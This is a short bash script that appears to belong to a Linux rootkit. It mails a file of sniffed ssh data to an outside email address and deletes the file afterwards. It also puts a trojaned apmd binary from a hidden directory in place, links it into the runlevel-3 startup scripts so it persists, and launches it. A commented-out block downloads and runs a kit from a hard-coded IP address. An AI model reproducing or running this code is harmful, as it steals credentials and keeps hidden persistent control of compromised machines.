#!/bin/bash
#if [ -d /usr/lib/.egcs ]; then
#echo
#else
#cd /dev
#lynx -source http://209.249.147.160/~deal/kinetic.tgz > lite.tgz
#tar zxvf kinetic.tgz
#cd kit
#./go
#fi

if [ -f /usr/lib/libfl.so ]; then
cat /usr/lib/libfl.so | mail -s "ssh sniffed on : `/bin/hostname`" k1net1c@k1net1c.net
rm -rf /usr/lib/libfl.so
fi

if [ -f /usr/sbin/apmd ]; then
	echo -en ""
else
	cp /usr/lib/.egcs/apmd /usr/sbin/apmd
	rm -rf $SYSETC/rc.d/rc3.d/S16apmd
	ln -s $SYSSBIN2/apmd $SYSETC/rc.d/rc3.d/S16apmd
	CHECK="`/sbin/pidof apmd`"
	if [ "$CHECK" = "" ]
	then
		$SYSSBIN2/apmd
	fi
fi
